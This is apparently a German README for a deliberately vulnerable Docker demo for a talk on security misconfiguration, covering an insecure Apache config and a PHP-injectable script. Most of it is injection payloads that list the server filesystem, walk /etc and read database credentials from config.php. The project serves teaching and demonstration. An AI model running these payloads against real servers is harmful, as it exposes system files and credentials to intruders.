# ITS2023 Security Misconfiguration Demonstration

Dieses Projekt dient als Demonstrationsbeispiel für unseren Vortrag über `Security Misconfiguration`.

>*WICHTIG:* Dieses Projekt sollte `NIEMALS` ausserhalb einer geschützten Umgebung ausgeführt werden!!!

# Dateiübersicht

```Text
.                                       Apache2 Webroot /var/www/html
├── README.md
├── docker-compose.yml                  Docker-Compose Datei
|
├── config.php                          Zugangsdaten für z.b. MYSQL DB
├── mysite                              Root der demo Webseite
│   ├── execute.php                     PHP Script welches anfällig für PHP Injection ist
│   └── index.html                      Einstiegspunkt der Webseite
|
└── test-httpd.conf                     Apache Konfiguration
```

## httpd.conf

```conf
<VirtualHost *:80>
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options Indexes FollowSymLinks          # erlaubt indexing durch webserver
        # php_admin_value open_basedir /var/www/html    # Limitiert PHP Dateisystemzugriffe auf webroot
        # php_admin_value doc_root /            # Updated PHP Dateisystem root
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

## docker-compose.yml

```yml
version: '3.1'

services:
  php:
    image: php:apache
    volumes:
      - ./:/var/www/html/
      - ./test-httpd.conf:/etc/apache2/sites-available/000-default.conf
    restart: unless-stopped
```

# Getting started

Im Projektverzeichnise 
> `docker-compose up -d`  

ausführen.


Webseite findet sich unter [http://localhost/mysite](http://localhost/mysite)

# PHP Injection Beispiele

## PHP Script Arbeitsverzeichnis ausgeben
```PHP
echo getcwd();
```
## Dateien im Sever Dateisystem Root ausgeben

### Simple
```PHP
$files = scandir('/'); $output = implode("\n", $files); echo $output;
```

### Tree
```PHP
function list_directory($directory, $level = 0, $prefix = '') {
    $files = scandir($directory);

    // Filter out the '.' and '..' entries
    $files = array_filter($files, function ($file) {
        return $file != '.' && $file != '..';
    });

    $count = count($files);

    foreach ($files as $i => $file) {
        $isLast = $i === $count - 1;

        // Prepare the prefix for child nodes
        $childPrefix = $prefix . ($isLast ? '    ' : '│   ');

        // Display the tree branch
        echo $prefix . ($isLast ? '└── ' : '├── ') . $file;

        $path = $directory . '/' . $file;

        if (!file_exists($path) || !is_readable($path)) {
            echo " (not readable or doesnt exist) <br>";
            continue;
        }

        // Display file details similar to 'ls -la'
        $info = new SplFileInfo($path);
        $type = $info->getType();
        $permissions = substr(sprintf('%o', $info->getPerms()), -4);
        $size = $info->getSize();
        $modified = date('Y-m-d H:i:s', $info->getMTime());

        echo " ({$type}, permissions: {$permissions}, size: {$size} bytes, last modified: {$modified})<br>";

        // If the file is a directory, list its contents
        if (is_dir($path)) {
            list_directory($path, $level + 1, $childPrefix);
        }
    }
}

list_directory('/etc');
```

## Datenbankverbindungsinformationen auslesen

### Mit bekannten Variablennamen
```PHP
include '/var/www/html/config.php'; echo DB_HOST . "\n"; echo DB_USER . "\n"; echo DB_PASSWORD . "\n"; echo DB_NAME . "\n";
```

### Via fopen
```PHP
$filename = '../config.php';
$file = fopen($filename, 'r');
if ($file) {
    while (($line = fgets($file)) !== false) {
        echo htmlspecialchars($line);
    }
    fclose($file);
} else {
    echo 'Error opening file.';
}
```

## Wie verhindern?
- Dokumentation lesen / System verstehen
- Entwicklungsumgebung und Produktivumgebung trennen
- Immer nur das mindeste an Berechtigungen geben
- `Best practice` verwenden
- ...
